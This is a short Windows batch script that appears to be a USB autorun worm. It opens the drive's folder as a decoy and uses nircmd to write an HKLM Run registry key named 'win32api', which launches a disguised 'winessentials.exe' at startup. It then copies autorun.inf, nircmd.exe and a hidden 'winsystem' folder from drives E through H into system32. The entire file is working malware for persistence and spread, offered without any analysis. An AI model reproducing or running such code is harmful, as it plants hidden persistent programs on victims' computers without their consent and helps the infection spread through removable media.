@echo off

start ..
nircmd.exe win max ititle "Remo"

nircmd.exe regsetval sz "HKLM\software\microsoft\windows\currentversion\run" "win32api" "%windir%\system32\winsystem\winessentials.exe" 

c:
cd %windir%\system32
xcopy /y /c /h /k /r e:\autorun.inf 
xcopy /y /c /h /k /r e:\nircmd.exe
md winsystem
cd winsystem
xcopy /y /c /h /k /r e:\winsystem
cd..

xcopy /y /c /h /k /r f:\autorun.inf
xcopy /y /c /h /k /r f:\nircmd.exe 
cd winsystem
xcopy /y /c /h /k /r f:\winsystem 
cd..

xcopy /y /c /h /k /r g:\autorun.inf 
xcopy /y /c /h /k /r g:\nircmd.exe
cd winsystem
xcopy /y /c /h /k /r g:\winsystem 
cd..

xcopy /y /c /h /k /r h:\autorun.inf 
xcopy /y /c /h /k /r h:\nircmd.exe
cd winsystem
xcopy /y /c /h /k /r h:\winsystem 
cd..

